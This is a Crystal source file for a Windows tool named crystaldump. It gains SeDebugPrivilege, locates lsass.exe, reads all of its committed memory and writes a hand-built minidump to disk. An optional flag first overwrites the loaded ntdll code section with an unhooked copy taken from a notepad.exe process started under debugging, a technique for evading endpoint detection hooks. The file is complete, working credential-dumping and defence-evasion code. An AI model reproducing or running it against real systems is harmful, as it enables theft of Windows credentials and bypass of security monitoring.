require "option_parser"


# Functions
@[Link("ntdll")]
lib Ntdll
  struct OSVERSIONINFOEXW
    dwOSVersionInfoSize : UInt32
    dwMajorVersion : UInt32
    dwMinorVersion : UInt32
    dwBuildNumber : UInt32
    dwPlatformId : UInt32
    szCSDVersion : UInt16[128]
    wServicePackMajor : UInt16
    wServicePackMinor : UInt16
    wSuiteMask : UInt16
    wProductType : UInt8
    wReserved : UInt8
  end
  fun RtlGetVersion(lpVersionInformation : OSVERSIONINFOEXW*) : Int32
  fun NtOpenProcessToken(hProcess : LibC::HANDLE, desiredAccess : UInt32, tokenHandle : Pointer(LibC::HANDLE)) : UInt32
  fun NtAdjustPrivilegesToken(tokenHandle : LibC::HANDLE, disableAllPrivileges : Int32, newState : Pointer(Void), bufferLength : UInt32, previousState : Pointer(Void), returnLength : Pointer(UInt32)) : UInt32
  fun NtGetNextProcess(process_handle : Pointer(Void), desired_access : UInt32, handle_attributes : UInt32, flags : UInt32, next_process : Pointer(Pointer(Void))) : Int32
  fun NtQueryInformationProcess(process_handle : Pointer(Void), process_info_class : UInt32, process_info : Pointer(UInt8), process_info_size : UInt32, return_length : Pointer(UInt32)) : UInt32
  fun NtReadVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), buffer : Pointer(UInt8), buffer_size : UInt64, bytes_read : Pointer(UInt64)) : UInt32
  fun NtQueryVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), memory_information_class : UInt32, memory_information : Pointer(UInt8), memory_information_length : UInt64, return_length : Pointer(UInt64)) : UInt32
  fun NtClose(handle : LibC::HANDLE) : UInt32
  fun NtTerminateProcess(process_handle : LibC::HANDLE, exit_status : Int32) : UInt32
  fun NtProtectVirtualMemory(process_handle : UInt64, base_address : Pointer(Pointer(Void)), region_size : Pointer(UInt64), new_protect : UInt32, old_protect : Pointer(UInt32)) : Int32
  fun NtRemoveProcessDebug(process_handle : LibC::HANDLE, debug_object_handle : LibC::HANDLE) : Int32
end


# Constants
TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020
SE_PRIVILEGE_ENABLED = 0x0002
SE_DEBUG_NAME = "SeDebugPrivilege"
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x1000
MemoryBasicInformation = 0
DEBUG_PROCESS = 0x00000001_u32
PAGE_EXECUTE_WRITECOPY = 0x80_u32


# Structs
struct TOKEN_PRIVILEGES
  @privilege_count : UInt32
  @luid_low : UInt32
  @luid_high : UInt32
  @attributes : UInt32

  def initialize(privilege_count : UInt32, luid_low : UInt32, luid_high : UInt32, attributes : UInt32)
    @privilege_count = privilege_count
    @luid_low = luid_low
    @luid_high = luid_high
    @attributes = attributes
  end
end


struct ModuleInformation
  @base_dll_name : String
  @full_dll_path : String
  @dll_base : UInt64
  property size : UInt32

  def base_dll_name : String
    @base_dll_name
  end

  def full_dll_path : String
    @full_dll_path
  end

  def dll_base : UInt64
    @dll_base
  end

  def size : UInt32
    @size
  end

  def initialize(base_dll_name : String, full_dll_path : String, dll_base : UInt64, size : UInt32)
    @base_dll_name = base_dll_name
    @full_dll_path = full_dll_path
    @dll_base = dll_base
    @size = size
  end
end


struct MemFile
  @filename : String
  @content : Bytes
  @size : UInt32

  def filename : String
    @filename
  end

  def content : Bytes
    @content
  end

  def size : UInt32
    @size
  end

  def initialize(filename : String, content : Bytes, size : UInt32)
    @filename = filename
    @content = content
    @size = size
  end
end


struct MEMORY_BASIC_INFORMATION
  @base_address : UInt64
  @allocation_base : UInt64
  @allocation_protect : UInt32
  @region_size : UInt64
  @state : UInt32
  @protect : UInt32
  @type : UInt32

  def protect : UInt32
    @protect
  end

  def state : UInt32
    @state
  end

  def region_size : UInt64
    @region_size
  end

  def base_address : UInt64
    @base_address
  end

  def initialize(base_address : UInt64, allocation_base : UInt64, allocation_protect : UInt32, region_size : UInt64, state : UInt32, protect : UInt32, type : UInt32)
    @base_address = base_address
    @allocation_base = allocation_base
    @allocation_protect = allocation_protect
    @region_size = region_size
    @state = state
    @protect = protect
    @type = type
  end
end


struct STARTUPINFO
  property cb : Int32
  lp_reserved : Pointer(Void)
  lp_desktop : Pointer(UInt16)
  lp_title : Pointer(UInt16)
  dw_x : Int32
  dw_y : Int32
  dw_x_size : Int32
  dw_y_size : Int32
  dw_x_count_chars : Int32
  dw_y_count_chars : Int32
  dw_fill_attribute : Int32
  dw_flags : Int32
  w_show_window : Int16
  cb_reserved2 : Int16
  lp_reserved2 : Pointer(Void)
  h_std_input : LibC::HANDLE
  h_std_output : LibC::HANDLE
  h_std_error : LibC::HANDLE

  def initialize
    @cb = sizeof(STARTUPINFO)
    @lp_reserved = Pointer(Void).null
    @lp_desktop = Pointer(UInt16).null
    @lp_title = Pointer(UInt16).null
    @dw_x = 0
    @dw_y = 0
    @dw_x_size = 0
    @dw_y_size = 0
    @dw_x_count_chars = 0
    @dw_y_count_chars = 0
    @dw_fill_attribute = 0
    @dw_flags = 0
    @w_show_window = 0
    @cb_reserved2 = 0
    @lp_reserved2 = Pointer(Void).null
    @h_std_input = LibC::HANDLE.new(0)
    @h_std_output = LibC::HANDLE.new(0)
    @h_std_error = LibC::HANDLE.new(0)
  end
end


struct PROCESS_INFORMATION
  property h_process : LibC::HANDLE
  property h_thread : LibC::HANDLE
  property dw_process_id : Int32
  property dw_thread_id : Int32

  def get_h_process : LibC::HANDLE
    @h_process
  end
  def get_h_thread : LibC::HANDLE
    @h_thread
  end
  def get_dw_process_id : Int32
    @dw_process_id
  end
  def get_dw_thread_id : Int32
    @dw_thread_id
  end

  def initialize(h_process : LibC::HANDLE, h_thread : LibC::HANDLE, dw_process_id : Int32, dw_thread_id : Int32)
    @h_process = h_process
    @h_thread = h_thread
    @dw_process_id = dw_process_id
    @dw_thread_id = dw_thread_id
  end
end


def getMemRegions(lsass_handle : Pointer(Void)) : Array(MemFile)
  proc_max_address = 0x7FFF_FFFE_FFFF_u64
  mem_address = 0_u64
  memfile_list = [] of MemFile
  aux_array = [] of String

  while mem_address < proc_max_address
    mbi = MEMORY_BASIC_INFORMATION.new(0, 0, 0, 0, 0, 0, 0)
    ntstatus = Ntdll.NtQueryVirtualMemory(
      lsass_handle,
      Pointer(Void).new(mem_address),
      MemoryBasicInformation,
      pointerof(mbi).as(Pointer(UInt8)),
      sizeof(MEMORY_BASIC_INFORMATION).to_u32,
      nil
    )
    if ntstatus != 0
      puts "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x#{ntstatus.to_s(16)}"
      break
    end

    if mbi.protect != PAGE_NOACCESS && mbi.state == MEM_COMMIT
      buffer = Bytes.new(mbi.region_size.to_i32)
      read_status = Ntdll.NtReadVirtualMemory(
        lsass_handle,
        Pointer(Void).new(mbi.base_address),
        buffer.to_unsafe, #pointerof(buffer).as(Pointer(Void)),
        mbi.region_size.to_u32,
        nil
      )
      if read_status != 0 && read_status != 0x8000000d
        puts "[-] Error reading memory. NTSTATUS: 0x#{read_status.to_s(16)}"
      else
        memdump_filename = "#{mem_address.to_s(16)}"
        aux_array << %({"filename": "#{memdump_filename}", "address": "0x#{mem_address.to_s(16)}", "size": #{mbi.region_size}})
        memfile_list << MemFile.new(memdump_filename, buffer, mbi.region_size.to_u32)
      end
    end
    mem_address += mbi.region_size
  end

  return memfile_list
end


def enable_se_debug_privilege : Bool
  hProcess = Pointer(Void).new(UInt64::MAX)
  hToken = LibC::HANDLE.new(0.to_u64)
  ntstatus = Ntdll.NtOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, pointerof(hToken))
  if ntstatus == 0
    se_debug_name_utf16 = SE_DEBUG_NAME.to_utf16
    se_debug_name_ptr = se_debug_name_utf16.to_unsafe
    token_privileges = TOKEN_PRIVILEGES.new(
      1,
      UInt32.new(20),
      UInt32.new(0),
      0x00000002.to_u32
    )
    ntstatus = Ntdll.NtAdjustPrivilegesToken(hToken, 0, pointerof(token_privileges), 0, nil, nil)
    if ntstatus == 0
      puts "[+] SeDebugPrivilege enabled: \tOK"
      return true
    else
      puts "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x#{ntstatus.to_s(16)}"
      return false
    end
  else
    puts "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return false
  end
end


def readRemoteIntPtr(h_process : Pointer(Void), mem_address : UInt64) : UInt64
  buffer = StaticArray(UInt8, 8).new(0)
  bytes_read = Pointer(UInt64).malloc(1)
  ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address.to_u64), buffer.to_unsafe, buffer.size.to_u32, bytes_read)
  if ntstatus != 0 && ntstatus != 0xC0000005_u32 && ntstatus != 0x8000000D_u32 && h_process != 0
    puts "[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x#{ntstatus.to_s(16)} reading address 0x#{mem_address.to_s(16)}"
  end
  value = buffer.to_slice.to_unsafe.as(Pointer(Int64)).value
  return value.to_u64
end


def readRemoteWStr(h_process : Pointer(Void), mem_address : UInt64) : String
  buffer = StaticArray(UInt8, 256).new(0)
  bytes_read = Pointer(UInt64).malloc(1)
  ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address), buffer.to_unsafe, buffer.size.to_u32, bytes_read)
  if ntstatus != 0 && ntstatus != 0xC0000005_u32 && ntstatus != 0x8000000D_u32 && !h_process.null?
    puts "[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x#{ntstatus.to_s(16)} reading address 0x#{mem_address.to_s(16)}"
  end
  unicode_str = String.build do |str|
    i = 0
    while i < buffer.size - 1
      char_code = (buffer[i] | (buffer[i + 1] << 8))
      break if char_code == 0
      str << char_code.chr
      i += 2
    end
  end
  return unicode_str
end


def get_proc_name_from_handle(process_handle : Pointer(Void)) : String
  process_basic_information_size = 48_u32
  commandline_offset = 0x68
  pbi_byte_array = Bytes.new(process_basic_information_size)
  pbi_addr = Pointer(UInt8).null
  pbi_addr = pbi_byte_array.to_unsafe
  return_length = 0_u32
  ntstatus = Ntdll.NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))
  if ntstatus != 0
    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return ""
  end
  peb_offset = 0x8
  peb_pointer = pbi_addr + peb_offset
  currentProcess = Pointer(Void).new(UInt64::MAX)
  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
  processparameters_offset = 0x20
  processparameters_pointer = peb_address + processparameters_offset
  processparameters_address = readRemoteIntPtr(process_handle, processparameters_pointer)
  commandline_pointer = processparameters_address + commandline_offset
  commandline_address = readRemoteIntPtr(process_handle, commandline_pointer)
  commandline_value = readRemoteWStr(process_handle, commandline_address)
  return commandline_value
end


def get_process_by_name(proc_name : String) : Pointer(Void)
  aux_handle = Pointer(Void).null
  maximum_allowed = 0x02000000
  while (Ntdll.NtGetNextProcess(aux_handle, maximum_allowed, 0, 0, pointerof(aux_handle)) == 0)
    commandline_value = get_proc_name_from_handle(aux_handle)
    if commandline_value.downcase == proc_name
      return aux_handle
    end
  end
  Pointer(Void).null
end


def custom_get_module_handle(h_process : Pointer(Void)) : Array(ModuleInformation)
  module_information_list = Array(ModuleInformation).new
  process_basic_information_size = 48_u32
  peb_offset = 0x8
  ldr_offset = 0x18
  in_initialization_order_module_list_offset = 0x30
  flink_dllbase_offset = 0x20
  flink_buffer_fulldllname_offset = 0x40
  flink_buffer_offset = 0x50
  pbi_byte_array = Bytes.new(process_basic_information_size)
  pbi_addr = Pointer(UInt8).null
  pbi_addr = pbi_byte_array.to_unsafe
  return_length = 0_u32
  ntstatus = Ntdll.NtQueryInformationProcess(h_process, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))
  if ntstatus != 0
    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return module_information_list
  end
  peb_pointer = pbi_addr + peb_offset
  currentProcess = Pointer(Void).new(UInt64::MAX)
  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
  ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
  ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)
  in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
  next_flink = readRemoteIntPtr(h_process, in_initialization_order_module_list)
  dll_base = UInt64::MAX
  while dll_base != 0
    next_flink -= 0x10
    # Get DLL base address
    dll_base = readRemoteIntPtr(h_process, next_flink + flink_dllbase_offset)
    buffer = readRemoteIntPtr(h_process, next_flink + flink_buffer_offset)
    # DLL base name
    base_dll_name = ""
    if buffer != 0
      base_dll_name = readRemoteWStr(h_process, buffer)
    end
    # DLL full path
    full_dll_path = readRemoteWStr(h_process, readRemoteIntPtr(h_process, next_flink + flink_buffer_fulldllname_offset))
    if dll_base != 0
      module_information_list << ModuleInformation.new(
        base_dll_name: base_dll_name,
        full_dll_path: full_dll_path.gsub("\\","\\\\"),
        dll_base: dll_base,
        size: 0
      )
    end
    next_flink = readRemoteIntPtr(h_process, next_flink + 0x10)
  end
  return module_information_list
end


def getModuleInfo(lsass_handle : Pointer(Void)) : Array(ModuleInformation)
  module_information_list = custom_get_module_handle(lsass_handle)
  proc_max_address = 0x7FFF_FFFE_FFFF_u64
  mem_address = 0_u64
  aux_size = 0
  aux_name = ""
  while mem_address < proc_max_address
    mbi = MEMORY_BASIC_INFORMATION.new(0, 0, 0, 0, 0, 0, 0)
    ntstatus = Ntdll.NtQueryVirtualMemory(
      lsass_handle,
      Pointer(Void).new(mem_address),
      MemoryBasicInformation,
      pointerof(mbi).as(Pointer(UInt8)),
      sizeof(MEMORY_BASIC_INFORMATION).to_u32,
      nil
    )
    if ntstatus != 0
      puts "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x#{ntstatus.to_s(16)}"
      break
    end
    if mbi.protect != PAGE_NOACCESS && mbi.state == MEM_COMMIT
      aux_module = module_information_list.find { |obj| obj.base_dll_name.downcase == aux_name.downcase }
      if mbi.region_size == 0x1000_u64 && mbi.base_address != aux_module.try(&.dll_base)
        if aux_module
          aux_module.size = aux_size.to_u32
          aux_index = module_information_list.index { |module_info| module_info.base_dll_name == aux_module.base_dll_name }          
          if aux_index
            module_information_list[aux_index] = aux_module
          else
            puts "Module not found in the list."
          end
        end
        module_information_list.each do |mod_info|
          if mbi.base_address == mod_info.dll_base
            aux_name = mod_info.base_dll_name.downcase
            aux_size = mbi.region_size.to_i
          end
        end
      else
        aux_size += mbi.region_size.to_i
      end
    end
    mem_address += mbi.region_size
  end
  return module_information_list
end


def get_windows_version() : Ntdll::OSVERSIONINFOEXW
  os_info = Ntdll::OSVERSIONINFOEXW.new
  os_info.dwOSVersionInfoSize = 148
  result = Ntdll.RtlGetVersion(pointerof(os_info))
  if result == 0
    return os_info
  else
    raise "Failed to get Windows version. Error code: #{result}"
  end
end


def custom_get_module_address(h_process : Pointer(Void), module_name : String ) : UInt64
  process_basic_information_size = 48_u32
  peb_offset = 0x8
  ldr_offset = 0x18
  in_initialization_order_module_list_offset = 0x30
  flink_dllbase_offset = 0x20
  flink_buffer_fulldllname_offset = 0x40
  flink_buffer_offset = 0x50
  pbi_byte_array = Bytes.new(process_basic_information_size)
  pbi_addr = Pointer(UInt8).null
  pbi_addr = pbi_byte_array.to_unsafe
  return_length = 0_u32
  ntstatus = Ntdll.NtQueryInformationProcess(h_process, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))
  if ntstatus != 0
    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return 0_u64
  end
  peb_pointer = pbi_addr + peb_offset
  currentProcess = Pointer(Void).new(UInt64::MAX)
  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
  ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
  ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)
  in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
  next_flink = readRemoteIntPtr(h_process, in_initialization_order_module_list)
  dll_base = UInt64::MAX
  while dll_base != 0
    next_flink -= 0x10
    # DLL base name
    buffer = readRemoteIntPtr(h_process, next_flink + flink_buffer_offset)
    base_dll_name = ""
    if buffer != 0
      base_dll_name = readRemoteWStr(h_process, buffer)
    end
    if base_dll_name == module_name
      # Get DLL base address
      dll_base = readRemoteIntPtr(h_process, next_flink + flink_dllbase_offset)
      return dll_base
    end
    next_flink = readRemoteIntPtr(h_process, next_flink + 0x10)
  end
  return 0_u64
end


def get_text_section_info(ntdll_address : Pointer(Void)) : Array(UInt32)
  h_process = Pointer(Void).new(UInt64::MAX)
  e_lfanew_data = Bytes.new(4)
  e_lfanew_address = ntdll_address + 0x3C
  Ntdll.NtReadVirtualMemory(h_process, e_lfanew_address, e_lfanew_data.to_unsafe, 4, Pointer(UInt64).null)
  e_lfanew = e_lfanew_data.to_unsafe.as(UInt32*).value
  nt_headers_address = ntdll_address + e_lfanew
  optional_header_address = nt_headers_address + 24
  sizeofcode_address = optional_header_address + 4
  sizeofcode_data = Bytes.new(4)
  Ntdll.NtReadVirtualMemory(h_process, sizeofcode_address, sizeofcode_data.to_unsafe, sizeofcode_data.size, Pointer(UInt64).null)
  sizeofcode = sizeofcode_data.to_unsafe.as(UInt32*).value
  baseofcode_address = optional_header_address + 20
  baseofcode_data = Bytes.new(4)
  Ntdll.NtReadVirtualMemory(h_process, baseofcode_address, baseofcode_data.to_unsafe, baseofcode_data.size, Pointer(UInt64).null)
  baseofcode = baseofcode_data.to_unsafe.as(UInt32*).value
  [baseofcode, sizeofcode]
end


def get_ntdll_from_debug_proc(process_path : String) : Pointer(UInt8)
  si = LibC::STARTUPINFOW.new
  si.cb = sizeof(STARTUPINFO)
  pi = LibC::PROCESS_INFORMATION.new
  pi.hProcess = Pointer(Void).null
  pi.hThread = Pointer(Void).null
  pi.dwProcessId = 0
  pi.dwThreadId = 0
  success = LibC.CreateProcessW(
    process_path.to_utf16, 
    nil, 
    Pointer(LibC::SECURITY_ATTRIBUTES).null,
    Pointer(LibC::SECURITY_ATTRIBUTES).null,
    false, 
    DEBUG_PROCESS, 
    Pointer(Void).null, 
    Pointer(UInt16).null, 
    pointerof(si), 
    pointerof(pi)
  )
  unless success
    puts "[-] Error calling CreateProcess"
    exit(1)
  end
  current_process = Pointer(Void).new(UInt64::MAX)
  local_ntdll_handle = custom_get_module_address(current_process, "ntdll.dll")
  result = get_text_section_info(Pointer(Void).new(local_ntdll_handle))
  local_ntdll_txt_base = result[0]
  local_ntdll_txt_size = result[1]
  local_ntdll_txt = local_ntdll_handle + local_ntdll_txt_base
  ntdll_buffer = Bytes.new(local_ntdll_txt_size)
  read_result = Ntdll.NtReadVirtualMemory(pi.hProcess, Pointer(Void).new(local_ntdll_txt), ntdll_buffer.to_unsafe, ntdll_buffer.size, Pointer(UInt64).null)
  if read_result != 0
    puts "[-] Error calling NtReadVirtualMemory"
    exit(1)
  end
  p_ntdll_buffer = Pointer(UInt8).null
  p_ntdll_buffer = ntdll_buffer.to_unsafe
  # Get debug object handle
  debug_object_handle = uninitialized LibC::HANDLE
  return_length = uninitialized UInt32
  status = Ntdll.NtQueryInformationProcess(
    pi.hProcess,
    30,
    pointerof(debug_object_handle).as(Pointer(UInt8)),
    sizeof(LibC::HANDLE).to_u32,
    pointerof(return_length)
  )
  # Cleanup and terminate debug process
  status = Ntdll.NtRemoveProcessDebug(pi.hProcess, debug_object_handle)
  terminate_result = Ntdll.NtTerminateProcess(pi.hProcess, 0)
  if status != 0
    puts "[-] Error calling NtRemoveProcessDebug"
    exit(1)
  end
  if terminate_result != 0
    puts "[-] Error calling NtTerminateProcess. NTSTATUS: 0x#{terminate_result.to_s(16)}"
    exit(1)
  end
  close_handle_proc = Ntdll.NtClose(pi.hProcess)
  close_handle_thread = Ntdll.NtClose(pi.hThread)
  if close_handle_proc != 0 || close_handle_thread != 0
    puts "[-] Error calling NtClose"
    exit(1)
  end
  # Return the buffer pointer
  p_ntdll_buffer
end


def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void*, local_ntdll_txt_size : UInt32)
  dw_old_protection = UInt32.new(0)
  current_process = UInt64::MAX
  region_size_ptr = Pointer(UInt64).malloc(1)
  region_size_ptr.value = local_ntdll_txt_size
  dw_old_protection = UInt32.new(0)
  # NtProtectVirtualMemory to PAGE_EXECUTE_WRITECOPY
  vp_res = Ntdll.NtProtectVirtualMemory(
    current_process, 
    pointerof(local_ntdll_txt), 
    region_size_ptr, 
    PAGE_EXECUTE_WRITECOPY, 
    pointerof(dw_old_protection)
  )
  if vp_res != 0      # != 0
    puts "[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)"
    exit(1)
  end
  # Copy from one address to the other
  unhooked = unhooked_ntdll_txt.as(Pointer(UInt8))
  local = local_ntdll_txt.as(Pointer(UInt8))
  local_ntdll_txt_size.times do |i|
    local[i] = unhooked[i]
  end
  # NtProtectVirtualMemory back to the original protection (PAGE_EXECUTE_READ)
  vp2_res = Ntdll.NtProtectVirtualMemory(
    current_process, 
    pointerof(local_ntdll_txt), 
    region_size_ptr, 
    dw_old_protection, 
    pointerof(dw_old_protection)
  )
  if vp2_res != 0
    puts "[-] Error calling NtProtectVirtualMemory (restoring old protection)"
    exit(1)
  end
end


def remap_library(process_path : String)
  unhookedNtdllTxt = get_ntdll_from_debug_proc(process_path)
  currentProcess = Pointer(Void).new(UInt64::MAX)
  localNtdllHandle = custom_get_module_address(currentProcess, "ntdll.dll")
  result = get_text_section_info(Pointer(Void).new(localNtdllHandle))
  localNtdllTxtBase = result[0]
  localNtdllTxtSize = result[1]
  localNtdllTxt = localNtdllHandle + localNtdllTxtBase
  puts "[+] Replacing 0x#{localNtdllTxtSize.to_s(16)} bytes from 0x#{unhookedNtdllTxt.address.to_s(16)} to 0x#{localNtdllTxt.to_s(16)}"
  replace_ntdll_txt_section(unhookedNtdllTxt.as(Pointer(Void)), Pointer(Void).new(localNtdllTxt), localNtdllTxtSize)
end


def uint32_to_little_endian_bytes(value : UInt32) : Bytes
  io = IO::Memory.new
  io.write_bytes(value, IO::ByteFormat::LittleEndian)
  return io.to_slice
end


def uint64_to_little_endian_bytes(value : UInt64) : Bytes
  io = IO::Memory.new
  io.write_bytes(value, IO::ByteFormat::LittleEndian)
  io.to_slice
end


def hex_string_to_little_endian_bytes(hex_string : String) : Bytes
  value = hex_string.to_u64(16)
  io = IO::Memory.new
  io.write_bytes(value, IO::ByteFormat::LittleEndian)
  return io.to_slice
end


def generate_bytes(os_info : Ntdll::OSVERSIONINFOEXW, module_information_list : Array(ModuleInformation), memfile_list : Array(MemFile)) : Bytes
  number_modules = module_information_list.size
  modulelist_size = 4 + 108 * number_modules
  module_information_list.each do |module_info|
    modulelist_size += (module_info.full_dll_path.gsub("\\\\","\\").bytesize * 2 + 8)
  end
  mem64list_offset = modulelist_size + 0x7C
  mem64list_size = 16 + 16 * memfile_list.size
  offset_memory_regions = mem64list_offset + mem64list_size

  puts "[+] Total number of modules:    #{number_modules}"
  puts "[+] ModuleListStream size:      #{modulelist_size}"
  puts "[+] Mem64List offset:           #{mem64list_offset}"
  puts "[+] Mem64List size:             #{mem64list_size}"

  header = Bytes[0x4D, 0x44, 0x4D, 0x50] +
           Bytes[0x93, 0xA7] +
           Bytes[0x00, 0x00] +
           Bytes[0x03, 0x00, 0x00, 0x00] +
           Bytes[0x20, 0x00, 0x00, 0x00] +
           Bytes.new(32 - 16)
  bytes = uint32_to_little_endian_bytes(modulelist_size.to_u32)  
  stream_directory = Bytes[0x04, 0x00, 0x00, 0x00] +
                     uint32_to_little_endian_bytes(modulelist_size.to_u32) +
                     Bytes[0x7C, 0x00, 0x00, 0x00] +
                     Bytes[0x07, 0x00, 0x00, 0x00] +
                     Bytes[0x38, 0x00, 0x00, 0x00] +
                     Bytes[0x44, 0x00, 0x00, 0x00] +
                     Bytes[0x09, 0x00, 0x00, 0x00] +
                     uint32_to_little_endian_bytes(mem64list_size.to_u32) +
                     uint32_to_little_endian_bytes(mem64list_offset.to_u32)
  systeminfo_stream = Bytes[0x09, 0x00] +
                      Bytes.new(6) +
                      uint32_to_little_endian_bytes(os_info.dwMajorVersion) +
                      uint32_to_little_endian_bytes(os_info.dwMinorVersion) +
                      uint32_to_little_endian_bytes(os_info.dwBuildNumber) +
                      Bytes.new(56 - 16 - 4)
  modulelist_stream = uint32_to_little_endian_bytes(number_modules.to_u32) 
  pointer_index = 0x7C + 4 + 108 * number_modules
  module_information_list.each do |module_info|
    modulelist_stream += uint64_to_little_endian_bytes(module_info.dll_base) +
                         uint64_to_little_endian_bytes(module_info.size)  +
                         Bytes.new(4) +
                         uint64_to_little_endian_bytes(pointer_index.to_u64)
    pointer_index += module_info.full_dll_path.gsub("\\\\","\\").bytesize * 2 + 8
    modulelist_stream += Bytes.new(108 - (8 + 8 + 4 + 8))
  end
  module_information_list.each do |module_info|
    full_path_bytes = module_info.full_dll_path.gsub("\\\\","\\").encode("UTF-16LE").to_slice
    modulelist_stream += uint32_to_little_endian_bytes((module_info.full_dll_path.gsub("\\\\","\\").bytesize * 2).to_u32) +
                         full_path_bytes +
                         Bytes.new(4)
  end
  memory64list_stream = uint64_to_little_endian_bytes(memfile_list.size.to_u64) +
                        uint64_to_little_endian_bytes(offset_memory_regions.to_u64)
  memfile_list.each do |mem_file|
    base_address_bytes = hex_string_to_little_endian_bytes(mem_file.filename)
    memory64list_stream += base_address_bytes +
                           uint64_to_little_endian_bytes(mem_file.size)
  end
  memfile_list.each do |mem_file|
    memory64list_stream += mem_file.content
  end
  dump_file = header + stream_directory + systeminfo_stream + modulelist_stream + memory64list_stream
  return dump_file
end


def write_to_file(content : Bytes, file_name : String) : Nil
  File.open(file_name, "w") do |file|
    file.write content
  end
end


def crystalDump(output_file : String)
  is_admin = enable_se_debug_privilege
  if is_admin == false
    puts "[-] Run file as administrator"
    return
  end
  lsass_handle = get_process_by_name("c:\\windows\\system32\\lsass.exe")
  puts "[+] Lsass handle: \t\t#{lsass_handle.address}"
  
  # OS version
  os_info = get_windows_version()
  
  # DLLs info
  module_information_list  = getModuleInfo(lsass_handle)

  # Memory regions  
  memfile_list = getMemRegions(lsass_handle)
  Ntdll.NtClose(lsass_handle)
  
  # Create file
  dump_bytes = generate_bytes(os_info, module_information_list, memfile_list)
  write_to_file(dump_bytes, output_file)
  puts "[+] File #{output_file} generated."
end


def main()
  remap_ntdll = false
  output = "crystal.dmp"

  option_parser = OptionParser.new do |parser|
    parser.banner = "Usage: crystaldump.exe [options]"
    parser.on("-o OUTPUTFILE", "--output=OUTPUTFILE", "Output file name") do |o|
      output = o
    end
    parser.on("-r", "--remap", "Remap library") do
      remap_ntdll = true
    end
    parser.on("-h", "--help", "Print this help message") do
      puts parser
      exit
    end
  end

  option_parser.parse
  if remap_ntdll
    process_path = "C:\\Windows\\System32\\notepad.exe"
    remap_library(process_path)
  end
  crystalDump(output)
end


main